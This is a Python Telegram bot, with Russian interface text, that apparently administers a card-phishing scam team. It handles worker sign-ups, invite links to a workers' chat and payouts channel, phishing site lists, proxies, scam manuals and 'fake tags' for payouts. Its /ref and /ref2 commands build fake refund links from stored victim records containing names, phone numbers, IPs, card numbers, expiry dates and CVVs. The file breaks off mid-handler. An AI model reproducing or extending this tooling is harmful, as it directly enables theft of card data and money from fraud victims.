import os
import re
import sys
import time
import json
import random
import string
import datetime
from math import ceil

from random import randrange
import hashlib
#-------------------------
import telebot
from telebot import types,util
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
#-------------------------
import db
import config
import long_text
import bot_menues
import base_functions
from config import adminList, project_name
from base_functions import log
#-------------------------
#-------------------------
#-------------------------
knownUsers = {}
userStep = {}
username_list = {}
data_transfer_dict = {}
#-------------------------
#-------------------------
#-------------------------
def check_username(cid, username):
    if username == '' or username == None:
        bot.send_message(cid, long_text.user_no_username(),parse_mode = 'HTML',reply_markup=hideBoard)
        return False
    else:
        if db.get_user(cid) == None:
            return True
        else:
            if cid in username_list:
                if username != username_list[cid]:
                    username_list[cid] = username
                    db.update_username(cid,username)
            else:
                username_list[cid] = db.get_username(cid)
                if username != username_list[cid]:
                    username_list[cid] = username
                    db.update_username(cid,username)
    return username_list
#-------------------------
def listener(messages):
    try:
        for m in messages:

            cid = m.chat.id
            username = m.chat.username

            if m.chat.type != 'private':
                return
            else:
                check_result = check_username(cid, username)

            if not check_result:
                return
            elif check_result:
                pass
            else:
                username_list = check_result

            if m.content_type == 'text':
                print(str(m.chat.username) + " [" + str(m.chat.id) + "]: " + m.text)
                try:
                    print(f'knownUsers:{knownUsers}\nuserStep:{userStep}')
                except Exception as e:
                    pass
    except Exception as e:
        log(e)
#-------------------------
def get_user_step(uid):
    try:
        if uid in userStep:
            return userStep[uid]
        else:
            restart(uid)
    except Exception as e:
        log(e)
#-------------------------
#-------------------------
#-------------------------
db.create_tables()

db.update_bot_token(config.TOKEN)

base_functions.init_logs()
# bot = telebot.AsyncTeleBot(config.TOKEN)
bot = telebot.TeleBot(config.TOKEN)
bot.set_update_listener(listener)
hideBoard = types.ReplyKeyboardRemove()
#-------------------------
#-------------------------
#-------------------------
def restart(cid):
    try:
        if cid not in knownUsers:
            if cid in adminList:
                knownUsers[cid] = 'ACTIVE'
            else:
                try:
                    user_data = db.get_user(cid)
                    if user_data == None:
                        knownUsers[cid] = 'NEW_USER'
                        try:
                            bot.send_message(cid, '🤨', reply_markup=hideBoard)
                        except:
                            pass
                        markup = types.InlineKeyboardMarkup()
                        markup.row(InlineKeyboardButton('Запросить доступ', callback_data=f"new_user-new_connect"))
                        bot.send_message(cid, long_text.first_connect(''), parse_mode = 'HTML',reply_markup=markup)
                    else:
                        knownUsers[cid] = user_data['status']
                        if knownUsers[cid] == 'BAN':
                            del knownUsers[int(cid)]
                            del userStep[int(cid)]
                except Exception as e:
                    log(e)
        userStep[cid] = 'START'
    except Exception as e:
        log(e)
#-------------------------
@bot.message_handler(commands=['token'])
def command_reg(m):
    try:
        cid = m.chat.id

        if cid not in adminList:
            if str(cid) != str(config.pay_admin_chat):
                return

        text = m.text
        try:
            m_id = text.split(' ')[1]
            p_id = m_id.split('id')[1]
            token = text.split(' ')[2]
        except:
            bot.send_message(cid,'❌ Неверная форма: \n/token id000 q93e....9q1s29s \n\n-где: \nid000 - id платежа\n1q93e....9q1s29s - токен\n\n ВСЁ ЧЕРЕЗ ПРОБЕЛ')
            return

        data = db.get_payment_data_byid(p_id)
        if data == '' or data == None or data == []:
            bot.send_message(cid,'❌ Не найден id мамонта')
            return

        worker_id = data['worker_id']

        db.upd_token(p_id,token)

        bot.send_message(cid,'✅Токен установлен')

    except Exception as e:
        log(e)


@bot.message_handler(commands=['ref'])
def command_reg(m):
    try:
        cid = m.chat.id

        if cid not in adminList:
            if str(cid) != str(config.pay_admin_chat):
                return

        text = m.text
        try:
            mid = text.split(' ')[1]
            amount = text.split(' ')[2]
        except:
            bot.send_message(cid, '❌ Неверная форма создания ссылки на возврат:\n\n/reg 888888 2490\n\n-где: 888888 - PayId успешной оплаты мамонта \n2490 - сумма')
            return

        data = db.get_payment_data_byid(mid)
        if data == '' or data == None or data == []:
            bot.send_message(cid,'❌ Не найден PayId')
            return

        # pid = data['id']
        worker_id = data['worker_id']
        old_link = data['link']



        str2hash = str(randrange(100000))
        result = hashlib.md5(str2hash.encode()).hexdigest()
        link = old_link.split('payments')[0]+'refunds/'+result

        site_url = data['site_url']
        # amount = data['amount']
        payment_type = 'ref'
        person_ip = data['person_ip']
        id_person = data['id_person']
        person_name = data['person_name']
        tel_number = data['tel_number']
        card_number = data['card_number']
        card_exp = data['card_exp']
        card_cvv = data['card_cvv']
        card_holder = data['card_holder']

        db.new_ref_row(worker_id, link, site_url,amount,payment_type,person_ip,id_person,person_name,tel_number,card_number,card_exp,card_cvv,card_holder)

        bot.send_message(cid,f'Ссылка на возврат:\n\n<i>{link}</i>',parse_mode='HTML')

    except Exception as e:
        log(e)


@bot.message_handler(commands=['ref2'])
def command_reg(m):
    try:
        cid = m.chat.id

        if cid not in adminList:
            if str(cid) != str(config.pay_admin_chat):
                return

        text = m.text
        try:
            mid = text.split(' ')[1]
            amount = text.split(' ')[2]
        except:
            bot.send_message(cid, '❌ Неверная форма создания ссылки на возврат:\n\n/reg 888888 2490\n\n-где: 888888 - PayId успешной оплаты мамонта  \n2490 - сумма')
            return

        data = db.get_payment_data_byid(mid)
        if data == '' or data == None or data == []:
            bot.send_message(cid,'❌ Не найден PayId')
            return

        worker_id = data['worker_id']
        old_link = data['link']



        str2hash = str(randrange(100000))
        result = hashlib.md5(str2hash.encode()).hexdigest()
        link = old_link.split('payments')[0]+'refunds/'+result

        site_url = data['site_url']
        payment_type = 'ref2'
        person_ip = data['person_ip']
        id_person = data['id_person']
        person_name = data['person_name']
        tel_number = data['tel_number']
        card_number = ''
        card_exp = ''
        card_cvv = ''
        card_holder = ''

        db.new_ref_row(worker_id, link, site_url,amount,payment_type,person_ip,id_person,person_name,tel_number,card_number,card_exp,card_cvv,card_holder)

        bot.send_message(cid,f'Ссылка на возврат (без автозаполнения):\n\n<i>{link}</i>',parse_mode='HTML')

    except Exception as e:
        log(e)


@bot.message_handler(commands=['start'])
def command_start(m):
    try:
        global username_list
        cid = m.chat.id

        if m.chat.type != 'private':
            return

        chat_type = m.chat.type
        username = m.chat.username


        if cid not in knownUsers:
            if cid in adminList:
                knownUsers[cid] = 'ACTIVE'

                if db.get_user(cid) == None:
                    db.add_new_user(cid, username, ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6)) )
                    db.update_user_status(cid, 'ACTIVE')
                    db.update_user_data(cid,'role','admin')

                user_data = db.get_user(cid)
                if 'worker' in user_data['role'] or 'admin' in user_data['role']:
                    userStep[cid] = bot_menues.user_admin(bot,cid)
                else:
                    userStep[cid] = bot_menues.user_admin_support(bot,cid)

            else:
                user_data = db.get_user(cid)
                if user_data == None:
                    knownUsers[cid] = 'NEW_USER'
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('Запросить доступ', callback_data=f"new_user-new_connect"))
                    bot.send_message(cid, long_text.first_connect(username), parse_mode = 'HTML',reply_markup=markup)
                else:
                    knownUsers[cid] = user_data['status']
                    if knownUsers[cid] == 'PENDING':
                        bot.send_message(cid,long_text.try_new_connect(), parse_mode = 'HTML')
                    else:
                        if knownUsers[cid] == 'BAN':
                            del knownUsers[int(cid)]
                            bot.delete_message(cid,m.message_id)
                            del userStep[int(cid)]

                            return
                        if 'worker' in user_data['role']:
                            bot_menues.user(bot,cid)
                        else:
                            bot_menues.user_support(bot,cid)
                            time.sleep(1)
                            bot.delete_message(cid,m.message_id)


        else:
            if cid in adminList:
                user_data = db.get_user(cid)
                print(user_data)
                if 'worker' in user_data['role'] or 'admin' in user_data['role']:
                    userStep[cid] = bot_menues.user_admin(bot,cid)
                else:
                    userStep[cid] = bot_menues.user_admin_support(bot,cid)
            elif knownUsers[cid] == 'ACTIVE':
                user_data = db.get_user(cid)
                if 'worker' in user_data['role']:
                    userStep[cid] = bot_menues.user(bot,cid)
                else:
                    userStep[cid] = bot_menues.user_support(bot,cid)
                    time.sleep(1)
                    bot.delete_message(cid,m.message_id)
            elif knownUsers[cid] == 'BAN':
                del knownUsers[int(cid)]
                del userStep[int(cid)]
                bot.delete_message(cid,m.message_id)
                return
            elif knownUsers[cid] == 'NEW_USER':
                markup = types.InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton('Запросить доступ', callback_data=f"new_user-new_connect"))
                bot.send_message(cid, long_text.first_connect(username), parse_mode = 'HTML',reply_markup=markup)
            elif knownUsers[cid] == 'PENDING':
                bot.send_message(cid,long_text.try_new_connect(), parse_mode = 'HTML')
        time.sleep(1)
        bot.delete_message(cid,m.message_id)

    except Exception as e:
        log(e)
#-------------------------
#-------------------------
#-------------------------
@bot.message_handler(func=lambda message: message.text == '🔱 Админ')
def command_rules(m):
    try:
        cid = m.chat.id

        if m.chat.type != 'private':
            return

        get_user_step(cid)
        bot.delete_message(cid,m.message_id)
        if cid in adminList:
            markup = bot_menues.admin_inline(bot,cid)
            bot.send_message(cid,'<b>МЕНЮ АДМИНА</b>',reply_markup=markup,parse_mode='HTML')

            userStep[cid] = 'ADMIN_MENU'
            knownUsers[cid] = 'ADMIN'
    except Exception as e:
        log(e)
#-------------------------
@bot.message_handler(func=lambda message: message.text == '👤 Профиль')
def command_rules(m):
    try:
        cid = m.chat.id

        if m.chat.type != 'private':
            return

        get_user_step(cid)
        bot.delete_message(cid,m.message_id)
        if cid in knownUsers:
            user_data = db.get_user(cid)
            profits = db.get_user_profits(cid)
            markup = types.InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton('⚙️ Настройки', callback_data='user-settings'))
            markup.row(InlineKeyboardButton('❌', callback_data='close'))
            bot.send_message(cid, long_text.profile(user_data,profits),reply_markup=markup,parse_mode='HTML')
            userStep[cid] = 'USER_PROFILE'
    except Exception as e:
        log(e)
#-------------------------
@bot.message_handler(func=lambda message: message.text == '🌐 Сайты')
def command_rules(m):
    try:
        cid = m.chat.id

        if m.chat.type != 'private':
            return

        get_user_step(cid)
        bot.delete_message(cid,m.message_id)
        if cid in knownUsers:

            sites_data = db.get_site_list()
            sites_counter = len(sites_data)
            markup = base_functions.keybard_table(db.get_site_list(),'name','sites_list','id','',10, 1,0)

            if cid in adminList:
                markup.row(InlineKeyboardButton('Добавить новый сайт', callback_data=f"admin-add_new_site"))

            markup.row(InlineKeyboardButton('❌', callback_data=f"close"))
            bot.send_message(cid, long_text.sites_list(sites_counter),reply_markup=markup,parse_mode='HTML')
            userStep[cid] = 'SITES_LIST'
    except Exception as e:
        log(e)
#-------------------------
@bot.message_handler(func=lambda message: message.text == '🛠 Инструменты')
def command_rules(m):
    try:
        cid = m.chat.id

        if m.chat.type != 'private':
            return

        get_user_step(cid)
        bot.delete_message(cid,m.message_id)
        if cid in knownUsers:

            markup = types.InlineKeyboardMarkup()
            # markup.row(InlineKeyboardButton('🧾 Генерация чека', callback_data='instruments-gen_check'),InlineKeyboardButton('🎫 Отрисовка билета', callback_data='instruments-billet'))
            # markup.row(InlineKeyboardButton('💳 Ручная карта', callback_data='instruments-get_card'),InlineKeyboardButton('➕ 5% к выплате', callback_data='instruments-add_five'))
            # markup.row(InlineKeyboardButton('📚 Мануалы', callback_data='instruments-manuals'),InlineKeyboardButton('🎟️ Купоны', callback_data='instruments-coupones'))
            markup.row(InlineKeyboardButton('📚 Мануалы', callback_data='instruments-manuals'),InlineKeyboardButton('🎫 Отрисовка', callback_data='instruments-billet'))
            markup.row(InlineKeyboardButton('❌', callback_data='close'))
            bot.send_message(cid, '🛠 <b>Инструменты</b>',reply_markup=markup,parse_mode='HTML')
            userStep[cid] = 'INSTRUMENTS_MENU'
    except Exception as e:
        log(e)
#-------------------------
@bot.message_handler(func=lambda message: message.text == '🏆 Конкурс')
def command_rules(m):
    try:
        cid = m.chat.id

        if m.chat.type != 'private':
            return

        get_user_step(cid)
        bot.delete_message(cid,m.message_id)

        if cid in knownUsers:

            contests = db.get_contest()
            markup = types.InlineKeyboardMarkup()
            # print(contests)
            if cid in adminList:
                if contests['description'] != None:
                    markup.row(InlineKeyboardButton('Изменить конкурс', callback_data='contest-edit'))
                else:
                    markup.row(InlineKeyboardButton('Создать конкурс', callback_data='contest-add_new'))

            markup.row(InlineKeyboardButton('❌', callback_data='close'))

            if contests['description'] != None:
                text = contests['description']
                if contests['name'] != 'null' and contests['name'] != None and contests['name'] != '':
                    ent = contests['name']
                    ent = m.parse_entities(json.loads(ent))
                else:
                    ent = None
                bot.send_message(cid, text, reply_markup=markup,caption_entities=ent)
            else:
                text = 'На данный момент конкурсы не проводятся'
                bot.send_message(cid, text,reply_markup=markup, parse_mode='HTML')

            userStep[cid] = 'KONKURS'
    except Exception as e:
        log(e)
#-------------------------

#-------------------------

#-------------------------
#-------------------------
#-------------------------
@bot.message_handler(func=lambda message: True, content_types=['text'])
def command_default(m):

    try:
        cid = m.chat.id
        text = m.text
        ent = m.entities

        if m.chat.type != 'private':
            return

        try:
            ent_json = m.json['entities']
        except:
            ent_json = None
        step = get_user_step(cid)

        if step == 'EDIT_REFLINK':
            markup = types.InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'user-settings'))
            if re.findall(r'^[A-Za-z0-9]+$',text) != [] and len(text)>=3 and len(text)<=15:
                db.update_user_data(cid,'reflink',text)
                msg = long_text.success_edit_reflink(text)
                userStep[cid] = 'EDIT_REFLINK_OK'
            else:
                msg = long_text.error_edit_reflink(text)
            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],reply_markup=markup, parse_mode='HTML')

        elif step == 'EDIT_FAKE_TAG':
            markup = types.InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'user-settings'))
            if len(text)>=3 and len(text)<=20:
                db.update_user_data(cid,'fake_username',text)
                msg = long_text.success_edit_fake_tag(text)
                userStep[cid] = 'EDIT_FAKE_TAG_OK'
            else:
                msg = long_text.error_edit_fake_tag(text)
            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],reply_markup=markup, parse_mode='HTML')

        elif step == 'CHANGE_CARD':
            markup = types.InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton('◀️Назад', callback_data='admin-menu'))
            db.update_cc(text)
            msg = long_text.success_edit_cc(text)
            userStep[cid] = 'CHANGE_CARD_OK'
            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],reply_markup=markup, parse_mode='HTML')

        elif step == 'CONTEST_EDIT':
            markup = types.InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton('◀️Готово', callback_data='contest-menu'))
            db.update_contest(text,json.dumps(ent_json))
            userStep[cid] = 'CONTEST_EDIT_OK'
            bot.edit_message_text(text, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],caption_entities = ent,reply_markup=markup)

        elif step == 'ADD_PRIVATE_ADDRESS':
            markup = types.InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton('◀️Готово', callback_data=f'sites_list-{data_transfer_dict[cid]["sid"]}-STATIC'))
            db.add_user_site_address(cid,text,data_transfer_dict[cid]['category'])
            bot.edit_message_text(long_text.success_new_private_address(text), chat_id=cid, message_id=data_transfer_dict[cid]['mid'],caption_entities = ent,reply_markup=markup)
            userStep[cid] = 'ADD_PRIVATE_ADDRESS_OK'

        elif step == 'ADD_PROXY':

            markup = types.InlineKeyboardMarkup()
            try:
                proxy_parts = text.split(':')
                ip = proxy_parts[2]+':'+proxy_parts[3]
                login = proxy_parts[0]
                password = proxy_parts[1]
                db.add_new_proxy(ip,login,password)
                msg = long_text.success_proxy_adding(text)

                markup.row(InlineKeyboardButton('◀️Готово', callback_data='admin-set_proxy'))
                userStep[cid] = 'ADD_PROXY_OK'
            except:
                markup.row(InlineKeyboardButton('◀️Назад', callback_data='admin-set_proxy'))
                msg = long_text.error_proxy_format(text)

            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],parse_mode='HTML',reply_markup=markup)

        elif step == 'ADD_MAN':
            markup = types.InlineKeyboardMarkup()

            try:
                md = text.split('\n')
                name = md[0]
                url = md[1]
                db.add_new_manual(name,url)
                msg = long_text.success_manual_adding(name,url)

                markup.row(InlineKeyboardButton('◀️Готово', callback_data='instruments-manuals'))
                userStep[cid] = 'ADD_MAN_OK'
            except:
                markup.row(InlineKeyboardButton('◀️Назад', callback_data='instruments-manuals'))
                msg = long_text.error_manual_format()

            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],parse_mode='HTML',reply_markup=markup)

        elif step == 'ADD_COUPNE':
            markup = types.InlineKeyboardMarkup()

            try:
                kd = text.split('\n')
                name = kd[0]
                code = kd[1]
                price = kd[2]
                db.add_new_coupone(cid,name,code,price)
                msg = long_text.success_promo_adding(name,code,price)
                markup.row(InlineKeyboardButton('◀️Готово', callback_data='instruments-coupones'))
                userStep[cid] = 'ADD_PROMO_OK'
            except Exception as e:
                print(e)
                markup.row(InlineKeyboardButton('◀️Назад', callback_data='instruments-coupones'))
                msg = long_text.error_promo_format()

            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],parse_mode='HTML',reply_markup=markup)

        elif step == 'ADD_SITE':
            markup = types.InlineKeyboardMarkup()
            try:
                sd = text.split('\n')
                name = sd[0]
                url = sd[1]
                description = sd[2]
                db.add_new_site(name,url,description)
                msg = long_text.success_site_adding(name,url,description)

                markup.row(InlineKeyboardButton('◀️Готово', callback_data='swiper-sites_list-left-1'))
                userStep[cid] = 'ADD_SITE_OK'
            except Exception as e:
                print(e)
                markup.row(InlineKeyboardButton('◀️Назад', callback_data='swiper-sites_list-left-1'))
                msg = long_text.error_site_format()
            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],parse_mode='HTML',reply_markup=markup)

        elif step == 'CHANGE_CHAT_SCRIPT':
            markup = types.InlineKeyboardMarkup()

            db.update_chat_link(text)
            msg = long_text.success_cl_update(text)
            markup.row(InlineKeyboardButton('◀️Готово', callback_data='admin-project_settings'))
            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],reply_markup=markup)
            userStep[cid] = 'CHANGE_CHAT_SCRIPT_OK'

        elif step == 'ADD_NEW_ADDRESS':
            sid = data_transfer_dict[cid]['sid']
            markup = types.InlineKeyboardMarkup()
            sites_data = db.get_site_byid(sid)
            try:
                city = text.split('\n')[0]
                addr = text.split('\n')[1]
                db.add_new_address(city+':'+addr, sid)
                msg = long_text.success_address_adding(city,addr,sites_data['name'])
                markup.row(InlineKeyboardButton('◀️Готово', callback_data=f'show_adresses-{sid}'))
                userStep[cid] = 'ADD_PROMO_OK'
            except Exception as e:
                print(e)
                markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'show_adresses-{sid}'))
                msg = long_text.error_addr_format()
            bot.edit_message_text(msg, chat_id=cid, message_id=data_transfer_dict[cid]['mid'],parse_mode='HTML',reply_markup=markup)

        bot.delete_message(cid,m.message_id)
    except Exception as e:
        log(e)
#-------------------------
#-------------------------
#-------------------------
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        # print(call.message.text)
        # print(call.message.entities)

        cid = call.from_user.id
        username = call.from_user.username
        params = call.data.split('-')
        get_user_step(cid)
        print(str(cid) +': '+str(params))

        if call.message.chat.type != 'private':
            cid = call.message.chat.id
            if str(cid) == config.admin_log_chat or str(cid) == config.pay_admin_chat:
                knownUsers[cid] = 'CHAT'
            else:
                print('незнакомая группа')
                return
        else:
            check_result = check_username(cid, username)
            if not check_result:
                return
            elif check_result:
                pass
            else:
                username_list = check_result

        if knownUsers[cid] != 'BAN':
            if params[0] == 'new_user':
                if params[1] == 'new_connect':
                    bot.delete_message(cid,call.message.id)
                    if knownUsers[cid] != 'NEW_USER':
                        bot.answer_callback_query(call.id, 'Вы уже подавали заявку на вступление.',show_alert = True)
                        return

                    db.add_new_user(cid, username, ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6)) )
                    bot.send_message(cid, "✅Ваш запрос был передан администрации проекта", parse_mode = 'HTML')

                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('✅', callback_data=f"new_user-accept-{cid}"), InlineKeyboardButton('❌', callback_data=f"close"))
                    bot.send_message(config.admin_log_chat, long_text.new_user_request(cid, username), parse_mode = 'HTML',reply_markup=markup)
                    knownUsers[cid] = 'PENDING'

                elif params[1] == 'accept':
                    new_user_cid = params[2]
                    db.update_user_status(new_user_cid, 'ACTIVE')
                    knownUsers[new_user_cid] = 'ACTIVE'
                    bot_menues.user(bot,new_user_cid)

                    group = bot.create_chat_invite_link(chat_id=config.main_chat, member_limit=1 )
                    channel = bot.create_chat_invite_link(chat_id=config.pay_log_chat, member_limit=1 )

                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('👥Чат воркеров', url=group.invite_link), InlineKeyboardButton('💸Канал с выплатами', url= channel.invite_link))

                    bot.send_message(new_user_cid, long_text.intro_txt(), parse_mode = 'HTML',reply_markup=markup)

                    try:
                        bot.delete_message(cid,call.message.id)
                    except:
                        bot.delete_message(call.message.chat.id,call.message.id)


            elif params[0] == 'user':
                if params[1] == 'settings':
                    if len(params) == 2:
                        switch = db.get_user(cid)['hide_username']
                    else:
                        switch = params[2]
                        if switch == 'hide_off':
                            db.update_user_data(cid,'hide_username',0)
                        else:
                            db.update_user_data(cid,'hide_username',1)

                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('📝 Изменить реферальный код', callback_data=f'user-edit_reflink-{call.message.id}'))
                    markup.row(InlineKeyboardButton('📝 Изменить тег в выплатах', callback_data=f'user-edit_fake_tag-{call.message.id}'))

                    if not switch or switch == 'hide_off':
                        markup.row(InlineKeyboardButton('🟢 Включить скрытие тега', callback_data='user-settings-hide_on'))
                    else:
                        markup.row(InlineKeyboardButton('🔴 Выключить скрытие тега', callback_data='user-settings-hide_off'))

                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'user-profile-{str(cid)}'))
                    bot.edit_message_text(long_text.profile_settings(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'USER_PROFILE_SETTINGS'

                elif params[1] == 'edit_reflink':
                    user_data = db.get_user(cid)
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'user-settings'))
                    bot.edit_message_text(long_text.settings_edit_reflink(user_data), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':params[2]}
                    userStep[cid] = 'EDIT_REFLINK'

                elif params[1] == 'edit_fake_tag':
                    user_data = db.get_user(cid)
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'user-settings'))
                    bot.edit_message_text(long_text.settings_edit_fake_tag(user_data), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':params[2]}
                    userStep[cid] = 'EDIT_FAKE_TAG'


                elif params[1] == 'profile':
                    user_id = params[2]
                    if len(params)>3:
                        if params[3] == 'ban':
                            db.update_user_status(user_id,'BAN')
                            del knownUsers[int(user_id)]
                            del userStep[int(user_id)]

                            # bot.answer_callback_query(cid,'Пользователь заблокирован')
                        elif params[3] == 'unban':
                            db.update_user_status(user_id,'ACTIVE')
                            try:
                                knownUsers[int(user_id)] = 'ACTIVE'
                            except:
                                print(e)
                            # bot.answer_callback_query(cid,'Пользователь разблокирован')

                            markup = types.InlineKeyboardMarkup()
                            markup.row(InlineKeyboardButton('❌', callback_data='close'))
                            bot.send_message(user_id,'Нажмите <b>/start</b>',parse_mode='HTML', reply_markup=markup)

                        # if params[3] == 'switch_caller':
                    #         db.user_switch_role_caller(user_id)
                    #         user_data = db.get_user(user_id)
                    #         if 'worker' not in user_data['role']:
                    #             msg = bot_menues.user_admin(bot,user_id)
                    #             markup = types.InlineKeyboardMarkup()
                    #             markup.row(InlineKeyboardButton('❌', callback_data='close'))
                    #             bot.send_message(user_id,'Нажмите <b>/start</b> для обновления клавиатуры',parse_mode='HTML', reply_markup=markup)
                    #     elif params[3] == 'switch_support':
                    #         db.user_switch_role_support(user_id)
                    #         user_data = db.get_user(user_id)
                    #         if 'worker' not in user_data['role']:
                    #             msg = bot_menues.user_admin(bot,user_id)
                    #             markup = types.InlineKeyboardMarkup()
                    #             markup.row(InlineKeyboardButton('❌', callback_data='close'))
                    #             bot.send_message(user_id,'Нажмите <b>/start</b> для обновления клавиатуры',parse_mode='HTML', reply_markup=markup)

                    user_data = db.get_user(user_id)
                    profits = db.get_user_profits(user_id)
                    markup = types.InlineKeyboardMarkup()

                    if len(params) <= 3:
                        if str(cid) == user_id:
                            markup.row(InlineKeyboardButton('⚙️ Настройки', callback_data='user-settings'))
                        markup.row(InlineKeyboardButton('❌', callback_data='close'))
                    else:

                        # if 'support' in user_data['role']:
                        #     b1 = InlineKeyboardButton('🔴Звонилка', callback_data=f'user-profile-{user_id}-switch_caller')
                        #     b2 = InlineKeyboardButton('🟢Саппорт', callback_data=f'user-profile-{user_id}-switch_support')
                        # elif 'caller' in user_data['role']:
                        #     b1 = InlineKeyboardButton('🟢Звонилка', callback_data=f'user-profile-{user_id}-switch_caller')
                        #     b2 = InlineKeyboardButton('🔴Саппорт', callback_data=f'user-profile-{user_id}-switch_support')
                        # elif 'caller' in user_data['role'] and 'worker' in user_data['role']:
                        #     b1 = InlineKeyboardButton('🟢Звонилка', callback_data=f'user-profile-{user_id}-switch_caller')
                        #     b2 = InlineKeyboardButton('🟢Саппорт', callback_data=f'user-profile-{user_id}-switch_support')
                        # else:
                        #     b1 = InlineKeyboardButton('🔴Звонилка', callback_data=f'user-profile-{user_id}-switch_caller')
                        #     b2 = InlineKeyboardButton('🔴Саппорт', callback_data=f'user-profile-{user_id}-switch_support')

                        # markup.row(b1,b2)
                        if user_data['status'] == 'ACTIVE':
                            markup.row(InlineKeyboardButton('🚫 Заблокировать', callback_data=f'user-profile-{user_id}-ban'))
                        elif user_data['status'] == 'BAN':
                            markup.row(InlineKeyboardButton('⚠️ Разблокировать', callback_data=f'user-profile-{user_id}-unban'))

                        try:
                            markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-users_list-{params[4]}'))
                        except:
                            markup.row(InlineKeyboardButton('◀️Назад', callback_data='admin-users_list'))



                    bot.edit_message_text(long_text.profile(user_data,profits), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'USER_PROFILE'

            elif params[0] == 'admin':
                if params[1] == 'menu':
                    markup = bot_menues.admin_inline(bot,cid)
                    bot.edit_message_text('', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML' )
                    userStep[cid] = "ADMIN_MENU"

                elif params[1] == 'change_card':
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-get_card'))
                    bot.edit_message_text(long_text.change_card(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':call.message.id}
                    userStep[cid] = 'CHANGE_CARD'

                elif params[1] == 'users_list':
                    try:
                        markup = base_functions.keybard_table(db.get_all_users(),'username','user-profile','tg_chatid','-review',20, int(params[2])+1,0)
                    except:
                        markup = base_functions.keybard_table(db.get_all_users(),'username','user-profile','tg_chatid','-review',20, 1,0)
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-menu'))
                    bot.edit_message_text('<b>👥 СПИСОК ВОРКЕРОВ</b>', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'SITES_LIST'

                elif params[1] == 'add_manual':
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data='instruments-manuals'))
                    bot.edit_message_text(long_text.add_manual(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':call.message.id}
                    userStep[cid] = 'ADD_MAN'

                elif params[1] == 'delete_manual':
                    man_id = params[2]
                    db.del_manual(man_id)
                    bot.answer_callback_query(call.id, 'Мануал удалён!', show_alert = True)

                    manuals = db.get_manuals_list()
                    markup = types.InlineKeyboardMarkup()

                    if cid in adminList:
                        if manuals != []:
                            for each in manuals:
                                markup.row(
                                    InlineKeyboardButton(each["name"], url=each['link']),
                                    InlineKeyboardButton('❌', callback_data=f'admin-delete_manual-{each["id"]}')
                                )
                        markup.row(InlineKeyboardButton('Добавить новый мануал', callback_data=f'admin-add_manual'))
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))
                        bot.edit_message_text('<b>📚 МАНУАЛЫ</b>', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML' )
                    else:
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))
                        bot.edit_message_text(long_text.manuals_menu(manuals), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML' )
                    userStep[cid] = 'MANUALS_MENU'

                elif params[1] == 'set_adress':
                    pass

                elif params[1] == 'delete_site':
                    sid = params[2]
                    db.delete_site_byid(sid)
                    bot.answer_callback_query(call.id, 'Сайт был удалён!', show_alert = True)
                    markup = bot_menues.admin_inline(bot,cid)
                    bot.edit_message_text('', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML' )
                    userStep[cid] = "ADMIN_MENU"

                elif params[1] == 'add_new_site':
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-menu'))
                    bot.edit_message_text(long_text.add_site(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':call.message.id}
